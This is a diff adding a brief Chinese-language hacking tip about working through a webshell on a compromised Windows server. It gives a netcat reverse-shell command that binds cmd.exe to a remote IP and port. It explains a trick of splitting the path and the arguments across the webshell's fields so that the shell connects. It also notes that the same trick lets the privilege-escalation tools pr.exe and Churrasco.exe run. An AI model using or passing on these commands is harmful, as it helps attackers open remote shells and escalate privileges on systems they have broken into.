@@ -1,0 +1,16 @@
+Webshell cmd提权小技巧：
+
+Cmd路径：c:\windows\temp\cmd.exe
+
+Nc 也在同目录下，例如反弹cmdshell：
+
+"c:\windows\temp\nc.exe -vv ip 999 -e c:\windows\temp\cmd.exe"
+
+通常都不会成功。
+
+而直接在 cmd 路径上输入：c:\windows\temp\nc.exe
+
+命令输入：-vv ip 999 -e c:\windows\temp\cmd.exe
+
+却能成功。。这个不是重点
+我们通常执行 pr.exe 或 Churrasco.exe 的时候也需要按照上面的方法才能成功。
